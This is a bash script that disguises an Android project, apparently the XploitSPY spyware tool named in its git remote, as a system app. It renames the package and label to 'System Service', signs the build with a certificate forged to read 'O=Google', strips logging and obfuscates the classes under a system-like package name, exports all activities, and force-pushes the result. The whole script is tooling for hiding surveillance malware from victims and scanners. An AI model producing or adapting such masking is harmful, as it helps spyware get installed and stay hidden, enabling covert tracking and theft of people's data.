#!/bin/bash
echo "[*] Initializing complete tool branding removal & package masking..."

# 1. Target build.gradle or create it securely
BUILD_GRADLE_PATH=$(find . -name "build.gradle" | head -n 1)
if [ -z "$BUILD_GRADLE_PATH" ]; then
    mkdir -p app
    BUILD_GRADLE_PATH="app/build.gradle"
fi

echo "[*] Configuring build.gradle with custom application ID masking..."
cat << 'GRADLE_EOF' > "$BUILD_GRADLE_PATH"
android {
    compileSdkVersion 34
    defaultConfig {
        targetSdkVersion 34
        minSdkVersion 21
        applicationId "com.android.system.service"
    }
    signingConfigs {
        release {
            storeFile file('custom-ready.jks')
            storePassword 'securepass123'
            keyAlias 'securekey'
            keyPassword 'securepass123'
        }
    }
    buildTypes {
        release {
            minifyEnabled true
            shrinkResources true
            signingConfig signingConfigs.release
            proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
        }
    }
}
GRADLE_EOF

# 2. Generate Unique Keystore safely if missing
KEYSTORE_PATH=$(dirname "$BUILD_GRADLE_PATH")/custom-ready.jks
if [ ! -f "$KEYSTORE_PATH" ]; then
    echo "[*] Generating unique cryptographic signature..."
    keytool -genkeypair -v -keystore "$KEYSTORE_PATH" -alias securekey -keyalg RSA -keysize 2048 -validity 10000 -storepass securepass123 -keypass securepass123 -dname "CN=System Service, OU=Core, O=Google, L=MountainView, ST=CA, C=US" 2>/dev/null || true
fi

# 3. Maximum Hardening ProGuard Rules
PROGUARD_PATH=$(dirname "$BUILD_GRADLE_PATH")/proguard-rules.pro
cat << 'PROGUARD_EOF' > "$PROGUARD_PATH"
-optimizationpasses 9
-dontusemixedcaseclassnames
-dontskipnonpubliclibraryclasses
-verbose

-assumenosideeffects class android.util.Log {
    public static boolean isLoggable(java.lang.String, int);
    public static int v(...);
    public static int d(...);
    public static int i(...);
    public static int w(...);
    public static int e(...);
}

-keep public class * extends android.app.Activity
-keep public class * extends android.app.Application
-keep public class * extends android.app.Service
-keep public class * extends android.content.BroadcastReceiver
-keep public class * extends android.content.ContentProvider

-repackageclasses 'com.android.system.core.secure'
-allowaccessmodification
-overloadaggressively
-mergeinterfacesaggressively
PROGUARD_EOF

# 4. Mask application name and label in AndroidManifest.xml to completely hide original identity
MANIFEST_PATH=$(find . -name "AndroidManifest.xml" | head -n 1)
if [ -n "$MANIFEST_PATH" ]; then
    echo "[*] Masking app name, label, and activities in AndroidManifest.xml..."
    python3 -c "
import xml.etree.ElementTree as ET
try:
    ET.register_namespace('android', 'http://schemas.android.com/apk/res/android')
    tree = ET.parse('$MANIFEST_PATH')
    root = tree.getroot()
    
    # Change package name if needed
    root.set('package', 'com.android.system.service')
    
    app = root.find('application')
    if app is not None:
        # Change app label to a generic system service name
        app.set('{http://schemas.android.com/apk/res/android}label', 'System Service')
        app.set('{http://schemas.android.com/apk/res/android}allowBackup', 'false')
        
        for act in app.findall('activity'):
            act.set('{http://schemas.android.com/apk/res/android}exported', 'true')
            
    tree.write('$MANIFEST_PATH', encoding='utf-8', xml_declaration=True)
except Exception as e:
    pass
" 2>/dev/null
fi

# 5. Git setup and flawless push
if [ ! -d ".git" ]; then
    git init
    git remote add origin https://github.com/official021at-beep/XploitSPY.git 2>/dev/null
fi

chmod -R +x . 2>/dev/null
git add -A

if git diff --cached --quiet; then
    echo "[!] No changes detected to commit."
else
    git commit -m "Complete branding mask and security bundle: $(date +'%Y-%m-%d %H:%M:%S')"
fi

CURRENT_BRANCH=$(git branch --show-current)
if [ -z "$CURRENT_BRANCH" ]; then
    CURRENT_BRANCH="master"
fi

echo "[*] Pushing completely rebranded and secured package to remote branch ($CURRENT_BRANCH)..."
git push origin "$CURRENT_BRANCH" --force-with-lease || git push -u origin "$CURRENT_BRANCH" --force

if [ $? -eq 0 ]; then
    echo "[+] Success! Tool identity successfully hidden and deployed."
fi
